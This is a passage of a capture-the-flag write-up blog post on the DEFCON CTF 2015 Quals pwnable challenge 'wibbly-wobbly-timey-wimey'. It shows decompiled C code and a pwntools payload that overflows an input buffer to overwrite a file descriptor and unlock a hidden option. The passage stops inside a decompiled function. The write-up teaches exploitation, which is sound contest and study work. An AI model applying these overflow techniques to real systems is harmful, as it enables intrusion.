<!DOCTYPE html>



<html lang="zh-TW" 
  
    mode="dark"
  
>

  <!--
  The Head
-->

<head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  

    

    

  

  <!-- Begin Jekyll SEO tag v2.7.1 -->
<meta name="generator" content="Jekyll v4.2.0" />
<meta property="og:title" content="DEFCON CTF 2015 Quals – wibbly-wobbly-timey-wimey" />
<meta property="og:locale" content="zh_TW" />
<meta name="description" content="Category: Pwnable Points: 2 Wibbly Wobbly Timey Wimey Don’t blink! wwtw_c3722e23150e1d5abbc1c248d99d718d.quals.shallweplayaga.me:2606" />
<meta property="og:description" content="Category: Pwnable Points: 2 Wibbly Wobbly Timey Wimey Don’t blink! wwtw_c3722e23150e1d5abbc1c248d99d718d.quals.shallweplayaga.me:2606" />
<link rel="canonical" href="http://0.0.0.0:4000/defcon-ctf-2015-quals-wibbly-wobbly-timey-wimey/" />
<meta property="og:url" content="http://0.0.0.0:4000/defcon-ctf-2015-quals-wibbly-wobbly-timey-wimey/" />
<meta property="og:site_name" content="Hacking Tube 2.0" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2015-05-24T06:40:00+08:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="DEFCON CTF 2015 Quals – wibbly-wobbly-timey-wimey" />
<meta name="twitter:site" content="@bruce30262" />
<script type="application/ld+json">
{"url":"http://0.0.0.0:4000/defcon-ctf-2015-quals-wibbly-wobbly-timey-wimey/","headline":"DEFCON CTF 2015 Quals – wibbly-wobbly-timey-wimey","dateModified":"2021-07-19T21:12:41+08:00","datePublished":"2015-05-24T06:40:00+08:00","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"http://0.0.0.0:4000/defcon-ctf-2015-quals-wibbly-wobbly-timey-wimey/"},"description":"Category: Pwnable Points: 2 Wibbly Wobbly Timey Wimey Don’t blink! wwtw_c3722e23150e1d5abbc1c248d99d718d.quals.shallweplayaga.me:2606","@context":"https://schema.org"}</script>
<!-- End Jekyll SEO tag -->


  <title>DEFCON CTF 2015 Quals -- wibbly-wobbly-timey-wimey | Hacking Tube 2.0
  </title>

  <!--
  The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps
  Generated by: https://realfavicongenerator.net/
-->



<link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png">
<link rel="manifest" href="/assets/img/favicons/site.webmanifest">
<link rel="shortcut icon" href="/assets/img/favicons/favicon.ico">
<meta name="apple-mobile-web-app-title" content="Hacking Tube 2.0">
<meta name="application-name" content="Hacking Tube 2.0">
<meta name="msapplication-TileColor" content="#da532c">
<meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml">
<meta name="theme-color" content="#ffffff">


  <!-- Google Fonts -->
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous">
  <link rel="dns-prefetch" href="https://fonts.gstatic.com">

  <!-- GA -->
  

  <!-- jsDelivr CDN -->
  <link rel="preconnect" href="https://cdn.jsdelivr.net">
  <link rel="dns-prefetch" href="https://cdn.jsdelivr.net">

  <!-- Bootstrap -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css">

  <!-- Font Awesome -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css">

  <!--
  CSS selector for site.
-->

<link rel="stylesheet" href="/assets/css/style.css">


  <link rel="stylesheet"
    href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css">



  <!-- Manific Popup -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css">



  <!-- JavaScripts -->

  <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>

  <script defer
    src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script>

  <!--
  JS selector for site.
-->


  



  <!-- image lazy-loading & popup -->
  <script async
    src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js"></script>





<script defer src="/assets/js/dist/post.min.js"></script>






</head>


  <body data-spy="scroll" data-target="#toc">

    <!--
  The Side Bar
-->

<div id="sidebar" class="d-flex flex-column align-items-end">

  <div class="profile-wrapper text-center">
    <div id="avatar">
      <a href="/" alt="avatar" class="mx-auto">
        
        <img src="/assets/images/other/gravatar.png" alt="avatar" onerror="this.style.display='none'">
      </a>
    </div>

    <div class="site-title mt-3">
      <a href="/">Hacking Tube 2.0</a>
    </div>

    <div class="site-subtitle font-italic">Security and stuff</div>

  </div><!-- .profile-wrapper -->

  <ul class="w-100">
    <!-- home -->
    <li class="nav-item">
      <a href="/" class="nav-link">
        <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i>
        <span>HOME</span>
      </a>
    </li>
    <!-- the real tabs -->
    
    <li class="nav-item">
      <a href="/categories/" class="nav-link">
        <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i>
        <span>CATEGORIES</span>
      </a>
    </li> <!-- .nav-item -->
    
    <li class="nav-item">
      <a href="/tags/" class="nav-link">
        <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i>
        <span>TAGS</span>
      </a>
    </li> <!-- .nav-item -->
    
    <li class="nav-item">
      <a href="/archives/" class="nav-link">
        <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i>
        <span>ARCHIVES</span>
      </a>
    </li> <!-- .nav-item -->
    
    <li class="nav-item">
      <a href="/about/" class="nav-link">
        <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i>
        <span>ABOUT</span>
      </a>
    </li> <!-- .nav-item -->
    

  </ul> <!-- ul.nav.flex-column -->

  <div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center">

    
      

      
      <a href="https://github.com/bruce30262" aria-label="github"
        
        target="_blank" rel="noopener">
        <i class="fab fa-github-alt"></i>
      </a>
      

    
      

      
      <a href="https://twitter.com/bruce30262" aria-label="twitter"
        
        target="_blank" rel="noopener">
        <i class="fab fa-twitter"></i>
      </a>
      

    
      

      
      <a href="
          javascript:location.href = 'mailto:' + ['bruce30262','pm.me'].join('@')" aria-label="email"
        
        >
        <i class="fas fa-envelope"></i>
      </a>
      

    
      

      
      <a href="/feed.xml" aria-label="rss"
        
        >
        <i class="fas fa-rss"></i>
      </a>
      

    

    

  </div> <!-- .sidebar-bottom -->

</div><!-- #sidebar -->


    <!--
  The Top Bar
-->

<div id="topbar-wrapper" class="row justify-content-center topbar-down">
  <div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between">
    <span id="breadcrumb">

    

    

      

        
          

        

      

        
          <span>DEFCON CTF 2015 Quals -- wibbly-wobbly-timey-wimey</span>

        

      

    

    </span><!-- endof #breadcrumb -->

    <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i>

    <div id="topbar-title">
      Post
    </div>

    <i id="search-trigger" class="fas fa-search fa-fw"></i>
    <span id="search-wrapper" class="align-items-center">
      <i class="fas fa-search fa-fw"></i>
      <input class="form-control" id="search-input" type="search"
        aria-label="search" autocomplete="off" placeholder="Search...">
      <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i>
    </span>
    <span id="search-cancel" >Cancel</span>
  </div>

</div>


    <div id="main-wrapper">
      <div id="main">

        <!--
  Refactor the HTML structure.
-->



<!--
  In order to allow a wide table to scroll horizontally,
  we suround the markdown table with `<div class="table-wrapper">` and `</div>`
-->


<!--
  Fixed kramdown code highlight rendering:
  https://github.com/penibelst/jekyll-compress-html/issues/101
  https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901
-->


<!-- Add attribute 'hide-bullet' to the checkbox list -->




<!-- return -->
<div class="row">

  <div id="post-wrapper" class="col-12 col-lg-11 col-xl-8">

    <div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4">

      <h1 data-toc-skip>DEFCON CTF 2015 Quals -- wibbly-wobbly-timey-wimey</h1>

      <div class="post-meta text-muted d-flex flex-column">
        <!-- Published date and author -->
        <div>
          <span class="semi-bold">
            Bruce Chen
          </span>
          <!--
  Date format snippet
  See: /assets/js/_utils/timeage.js
-->





<span class="timeago "
  
    data-toggle="tooltip"
    data-placement="bottom"
    title="Sun, May 24, 2015,  6:40 AM +0800"
  

  
  prep="on" >

  
  

  
    May 24, 2015
  

  <i class="unloaded">2015-05-24T06:40:00+08:00</i>

</span>

        </div>

        <div>
          <!-- lastmod -->
          
          <span>
            <!--
  Date format snippet
  See: /assets/js/_utils/timeage.js
-->





<span class="timeago lastmod"
  
    data-toggle="tooltip"
    data-placement="bottom"
    title="Mon, Jul 19, 2021,  9:12 PM +0800"
  

  prefix="Updated "
   >

  
  

  
    Jul 19
  

  <i class="unloaded">2021-07-19T21:12:41+08:00</i>

</span>

          </span>
          

          <!-- read time -->
          <!--
  Calculate the post's reading time, and display the word count in tooltip
 -->


<!-- words per minute  -->







<!-- return element -->
<span class="readtime" data-toggle="tooltip" data-placement="bottom" title="2000 words">11 min</span>


          <!-- page views -->
          

        </div>

      </div> <!-- .post-meta -->

      <div class="post-content">

        

        <p><strong>Category:</strong> Pwnable<br />
<strong>Points:</strong> 2</p>
<blockquote>
  <p>Wibbly Wobbly Timey Wimey
Don’t blink!
wwtw_c3722e23150e1d5abbc1c248d99d718d.quals.shallweplayaga.me:2606</p>
</blockquote>

<!-- more -->

<p>32 bit ELF, with <strong>Partial RELRO</strong>, <strong>stack canary found</strong>, <strong>NX</strong> &amp; <strong>PIE</strong> enabled.<br />
First we’ll have to play a game:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
</pre></td><td class="rouge-code"><pre>You(^V&lt;&gt;) must find your way to the TARDIS(T) by avoiding the angels(A).
Go through the exits(E) to get to the next room and continue your search.
But, most importantly, don't blink!
   012345678901234567890
00                    E
01                     
02  A                  
03               A     
04 A                   
05                     
06               A     
07                A    
08                     
09        V       A    
10                  A  
11                A    
12              A      
13                     
14       A      A      
15                     
16                     
17                     
18                     
19                     
Your move (w,a,s,d,q):
</pre></td></tr></tbody></table></code></div></div>

<p>We’ll have to control <code class="language-plaintext highlighter-rouge">V</code> with <strong>wasd</strong>, and the goal is to reach the <code class="language-plaintext highlighter-rouge">E</code> without being touched by those <code class="language-plaintext highlighter-rouge">A</code>s. In the final stage, <code class="language-plaintext highlighter-rouge">E</code> will be changed to <code class="language-plaintext highlighter-rouge">T</code>, and we’ll win the game by reaching <code class="language-plaintext highlighter-rouge">T</code>. After we beat the game, it will ask us to input a <code class="language-plaintext highlighter-rouge">TARDIS KEY</code>. At this moment, teammate <strong>yench</strong> started writing a python script to beat the game, while me and other teammates try to figure out what is the <code class="language-plaintext highlighter-rouge">TARDIS KEY</code>.</p>

<p>We found the following C code:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
</pre></td><td class="rouge-code"><pre><span class="kt">signed</span> <span class="kt">int</span> <span class="nf">sub_EB8</span><span class="p">()</span>
<span class="p">{</span>
  <span class="kt">char</span> <span class="n">buf</span><span class="p">;</span> <span class="c1">// [sp+16h] [bp-12h]@3</span>
  <span class="kt">char</span> <span class="n">v2</span><span class="p">;</span> <span class="c1">// [sp+17h] [bp-11h]@9</span>
  <span class="kt">int</span> <span class="n">v3</span><span class="p">;</span> <span class="c1">// [sp+18h] [bp-10h]@1</span>
  <span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">v4</span><span class="p">)(</span><span class="kt">void</span><span class="p">);</span> <span class="c1">// [sp+1Ch] [bp-Ch]@1</span>

  <span class="n">v3</span> <span class="o">=</span> <span class="mi">10</span><span class="p">;</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"TARDIS KEY: "</span><span class="p">);</span>
  <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
  <span class="n">v4</span> <span class="o">=</span> <span class="n">sub_EB8</span><span class="p">;</span>
  <span class="k">while</span> <span class="p">(</span> <span class="n">v3</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span> <span class="n">isalnum</span><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)</span><span class="n">v4</span> <span class="o">&amp;</span> <span class="mh">0x7F</span><span class="p">)</span> <span class="p">)</span>
    <span class="p">{</span>
      <span class="k">if</span> <span class="p">(</span> <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">buf</span><span class="p">,</span> <span class="mi">1u</span><span class="p">)</span> <span class="o">==</span> <span class="mi">1</span> <span class="o">&amp;&amp;</span> <span class="n">buf</span> <span class="o">!=</span> <span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)</span><span class="n">v4</span> <span class="o">&amp;</span> <span class="mh">0x7F</span><span class="p">)</span> <span class="p">)</span>
        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
      <span class="o">--</span><span class="n">v3</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="n">v4</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="p">)(</span><span class="kt">void</span><span class="p">))((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">v4</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="k">do</span>
    <span class="n">v2</span> <span class="o">=</span> <span class="n">getchar</span><span class="p">();</span>
  <span class="k">while</span> <span class="p">(</span> <span class="n">v2</span> <span class="o">!=</span> <span class="mi">10</span> <span class="o">&amp;&amp;</span> <span class="n">v2</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span> <span class="p">);</span>
  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div>

<p>So it looks like the <code class="language-plaintext highlighter-rouge">TARDIS KEY</code> is a 10-byte-long string, which every character is the machine code in <code class="language-plaintext highlighter-rouge">sub_EB8()</code>, and the machine code should be an <strong>alpha-numeric character</strong> after it does the <code class="language-plaintext highlighter-rouge">&amp; 0x7F</code> operation. After we dump the machine code and wrote a script to extract the correct byte, we got the <code class="language-plaintext highlighter-rouge">TARDIS KEY</code> = <code class="language-plaintext highlighter-rouge">"UeSlhCAGEp"</code>.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td><td class="rouge-code"><pre>TARDIS KEY: UeSlhCAGEp
Welcome to the TARDIS!
Your options are: 
1. Turn on the console
2. Leave the TARDIS
Selection:
</pre></td></tr></tbody></table></code></div></div>

<p>Looks like it only gave us 2 options. But after we reverse the binary, we found that it actually has 3 options.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre></td><td class="rouge-code"><pre> <span class="k">if</span> <span class="p">(</span> <span class="n">LOBYTE</span><span class="p">(</span><span class="n">dword_50B0</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="o">==</span> <span class="sc">'3'</span> <span class="p">)</span> <span class="c1">//dword_50B0[0] == our input</span>
 <span class="p">{</span>
     <span class="k">if</span> <span class="p">(</span> <span class="n">unk_50AC</span> <span class="p">)</span>
     <span class="p">{</span>
        <span class="n">choice3</span><span class="p">();</span>
     <span class="p">}</span>
     <span class="k">else</span>
     <span class="p">{</span>
        <span class="n">puts</span><span class="p">(</span><span class="s">"Invalid"</span><span class="p">);</span>
        <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
     <span class="p">}</span>
 <span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div>

<p>We’ll have to make <code class="language-plaintext highlighter-rouge">unk_50AC</code> = 1. The only way to achieve this is to successfully turn on the TARDIS console:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre></td><td class="rouge-code"><pre> <span class="k">if</span> <span class="p">(</span> <span class="n">LOBYTE</span><span class="p">(</span><span class="n">dword_50B0</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="o">==</span> <span class="sc">'1'</span> <span class="p">)</span>
 <span class="p">{</span>
     <span class="n">LOBYTE</span><span class="p">(</span><span class="n">v4</span><span class="p">)</span> <span class="o">=</span> <span class="n">sub_E08</span><span class="p">();</span>
     <span class="k">if</span> <span class="p">(</span> <span class="n">v4</span> <span class="p">)</span>
     <span class="p">{</span>
         <span class="n">printf</span><span class="p">(</span><span class="s">"The TARDIS console is online!"</span><span class="p">);</span>
         <span class="n">unk_50AC</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
         <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
     <span class="p">}</span>
     <span class="k">else</span>
     <span class="p">{</span>
         <span class="n">printf</span><span class="p">(</span><span class="s">"Access denied except between %s and %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v7</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v8</span><span class="p">);</span>
         <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
     <span class="p">}</span>
 <span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div>

<p>The line <code class="language-plaintext highlighter-rouge">LOBYTE(v4) = sub_E08();</code> will do the following checking:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre><span class="n">BOOL</span> <span class="nf">sub_E08</span><span class="p">()</span>
<span class="p">{</span>
  <span class="k">return</span> <span class="n">dword_50A4</span> <span class="o">&gt;</span> <span class="mi">1431907180</span> <span class="o">&amp;&amp;</span> <span class="n">dword_50A4</span> <span class="o">&lt;=</span> <span class="mi">1431907199</span><span class="p">;</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div>

<p>and we can only write <code class="language-plaintext highlighter-rouge">dword_50A4</code> in function <code class="language-plaintext highlighter-rouge">sub_BCB()</code>:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
</pre></td><td class="rouge-code"><pre><span class="kt">size_t</span> <span class="nf">sub_BCB</span><span class="p">()</span>
<span class="p">{</span>
  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">v0</span><span class="p">;</span> <span class="c1">// eax@1</span>
  <span class="kt">size_t</span> <span class="n">result</span><span class="p">;</span> <span class="c1">// eax@7</span>
  <span class="kt">int</span> <span class="n">buf</span><span class="p">;</span> <span class="c1">// [sp+18h] [bp-10h]@5</span>
  <span class="kt">int</span> <span class="n">v3</span><span class="p">;</span> <span class="c1">// [sp+1Ch] [bp-Ch]@5</span>

  <span class="n">v0</span> <span class="o">=</span> <span class="n">unk_50A8</span><span class="o">++</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">v0</span> <span class="o">&gt;</span> <span class="mh">0xFFFFFFFF</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">Unauthorized occupant detected...goodbye"</span><span class="p">);</span>
    <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">dword_50B0</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">result</span> <span class="o">=</span> <span class="n">fwrite</span><span class="p">(</span><span class="s">"Time vortex not responding</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="mi">1u</span><span class="p">,</span> <span class="mh">0x1Bu</span><span class="p">,</span> <span class="n">stderr</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="k">else</span>
  <span class="p">{</span>
    <span class="n">write</span><span class="p">(</span><span class="n">dword_50B0</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="o">&amp;</span><span class="n">unk_2F4A</span><span class="p">,</span> <span class="mi">1u</span><span class="p">);</span>
    <span class="n">v3</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="n">dword_50B0</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="o">&amp;</span><span class="n">buf</span><span class="p">,</span> <span class="mi">4u</span><span class="p">);</span> <span class="c1">// here</span>
    <span class="k">if</span> <span class="p">(</span> <span class="n">v3</span> <span class="o">==</span> <span class="mi">4</span> <span class="p">)</span>
      <span class="n">dword_50A4</span> <span class="o">=</span> <span class="n">buf</span><span class="p">;</span> <span class="c1">//here</span>
    <span class="n">result</span> <span class="o">=</span> <span class="n">alarm</span><span class="p">(</span><span class="mi">2u</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div>

<p>Notice that <code class="language-plaintext highlighter-rouge">dword_50B0[2]</code> is the <strong>fd</strong>, and <code class="language-plaintext highlighter-rouge">dword_50B0[0]</code> is our <strong>input buffer</strong>(where the program store our <strong>options</strong>). By overflowing <code class="language-plaintext highlighter-rouge">dword_50B0[0]</code>, we can overwrite the value stored in <code class="language-plaintext highlighter-rouge">dword_50B0[2]</code> (the initial value is <strong>3</strong>, we’ll have to overwrite it to <strong>0</strong>(<code class="language-plaintext highlighter-rouge">stdin</code>) so we can write our input into <code class="language-plaintext highlighter-rouge">dword_50A4</code>).</p>

<p>To sum up, here are the steps for enabling the option 3:</p>
<ol>
  <li>Overwrite the <strong>fd</strong> (<code class="language-plaintext highlighter-rouge">dword_50B0[2]</code>) into <strong>0</strong> by overflowing <code class="language-plaintext highlighter-rouge">dword_50B0[0]</code></li>
  <li>Write the value into <code class="language-plaintext highlighter-rouge">dword_50A4</code> so it can pass the checking function <code class="language-plaintext highlighter-rouge">sub_E08()</code>. Notice that <code class="language-plaintext highlighter-rouge">sub_BCB()</code> is called by sending the <code class="language-plaintext highlighter-rouge">SIGALARM</code> signal, so be aware of the timing.</li>
  <li>Select option <strong>1</strong>, for turning on the TARDIS console.</li>
  <li>Option 3 will be enabled successfully after we turn on a TARDIS console.</li>
</ol>

<p>Here’s the payload:</p>
<div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre></td><td class="rouge-code"><pre><span class="k">print</span> <span class="n">t</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Selection: "</span><span class="p">)</span>
<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"overwriting fd..."</span><span class="p">)</span>
<span class="n">t</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="s">"11111111</span><span class="se">\x00\n</span><span class="s">"</span><span class="p">)</span> <span class="c1"># overwrite fd into stdin
</span><span class="k">print</span> <span class="n">t</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Selection: "</span><span class="p">)</span>
<span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span> <span class="c1"># wait for 2 second (until the service call sub_BCB())
</span><span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"enable choice 3..."</span><span class="p">)</span>
<span class="n">t</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="s">"m+YU</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span> <span class="c1"># m+YU = 1431907181
</span><span class="n">t</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="s">"1</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>    <span class="c1"># turn on the TARDIS console
</span><span class="k">print</span> <span class="n">t</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Selection: "</span><span class="p">)</span>
<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"writing fd back..."</span><span class="p">)</span>
<span class="n">t</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="s">"11111111</span><span class="se">\x03\n</span><span class="s">"</span><span class="p">)</span> <span class="c1"># write the fd back
</span><span class="k">print</span> <span class="n">t</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Selection: "</span><span class="p">)</span>
<span class="n">t</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"3"</span><span class="p">)</span>
<span class="n">t</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Coordinates: "</span><span class="p">)</span>
<span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">"choice 3 enabled success"</span><span class="p">)</span>
</pre></td></tr></tbody></table></code></div></div>

<p>After we successfully enable option 3, let’s see what does it do:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
</pre></td><td class="rouge-code"><pre><span class="kt">int</span> <span class="nf">choice3</span><span class="p">()</span>
<span class="p">{</span>
  <span class="kt">double</span> <span class="n">v0</span><span class="p">;</span> <span class="c1">// ST28_8@6</span>
  <span class="kt">int</span> <span class="n">result</span><span class="p">;</span> <span class="c1">// eax@9</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">nptr</span><span class="p">;</span> <span class="c1">// [sp+24h] [bp-424h]@4</span>
  <span class="kt">double</span> <span class="n">v3</span><span class="p">;</span> <span class="c1">// [sp+30h] [bp-418h]@6</span>
  <span class="kt">char</span> <span class="n">s</span><span class="p">;</span> <span class="c1">// [sp+3Ch] [bp-40Ch]@2</span>
  <span class="kt">int</span> <span class="n">v5</span><span class="p">;</span> <span class="c1">// [sp+43Ch] [bp-Ch]@1</span>

  <span class="n">v5</span> <span class="o">=</span> <span class="o">*</span><span class="n">MK_FP</span><span class="p">(</span><span class="n">__GS__</span><span class="p">,</span> <span class="mi">20</span><span class="p">);</span>
  <span class="k">while</span> <span class="p">(</span> <span class="mi">1</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="k">while</span> <span class="p">(</span> <span class="mi">1</span> <span class="p">)</span>
    <span class="p">{</span>
      <span class="n">printf</span><span class="p">(</span><span class="s">"Coordinates: "</span><span class="p">);</span>
      <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
      <span class="k">if</span> <span class="p">(</span> <span class="n">sub_F7E</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="o">&amp;</span><span class="n">s</span><span class="p">,</span> <span class="mi">1023</span><span class="p">,</span> <span class="mi">10</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span> <span class="p">)</span> <span class="c1">// input coordinates</span>
        <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
      <span class="n">nptr</span> <span class="o">=</span> <span class="n">strchr</span><span class="p">(</span><span class="o">&amp;</span><span class="n">s</span><span class="p">,</span> <span class="sc">','</span><span class="p">);</span> <span class="c1">// split with ','</span>
      <span class="k">if</span> <span class="p">(</span> <span class="n">nptr</span> <span class="p">)</span>
        <span class="k">break</span><span class="p">;</span>
      <span class="n">puts</span><span class="p">(</span><span class="s">"Invalid coordinates"</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="n">v0</span> <span class="o">=</span> <span class="n">atof</span><span class="p">(</span><span class="o">&amp;</span><span class="n">s</span><span class="p">);</span>
    <span class="n">v3</span> <span class="o">=</span> <span class="n">atof</span><span class="p">(</span><span class="n">nptr</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"%f, %f</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">v0</span><span class="p">,</span> <span class="n">v3</span><span class="p">);</span>
